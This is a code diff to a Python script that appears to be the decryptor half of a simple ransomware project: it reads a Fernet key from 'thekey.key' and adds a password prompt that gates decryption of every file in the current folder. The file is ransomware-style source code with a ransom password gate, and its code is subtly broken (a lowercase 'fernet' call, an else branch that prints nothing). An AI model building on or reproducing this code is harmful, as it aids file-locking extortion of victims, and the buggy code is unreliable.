@@ -13,14 +13,19 @@ for file in os.listdir():
   if os.path.isfile(file):
     files.append(file)
  
-key = Fernet.generate_key()
-
 with open("thekey.key", "rb") as key:
   secretkey = key.read()
   
-for file in files:
-  with open(file, "rb") as thefile:
-    contents = thefile.read()
-  contents_decrypted = fernet(secretkey).decrypt(contents)
-  with open(file, "wb") as thefile:
-    thefile.write(contents_decrypted)
+password = "All hail Jhin Hughes"
+textbox = input("Enter the password to decrypt your files. \n")
+
+if textbox  == password:
+  for file in files:
+    with open(file, "rb") as thefile:
+      contents = thefile.read()
+    contents_decrypted = fernet(secretkey).decrypt(contents)
+    with open(file, "wb") as thefile:
+      thefile.write(contents_decrypted)
+  print("Files decrypted.")
+else:
+  ("Not today, Jose.")
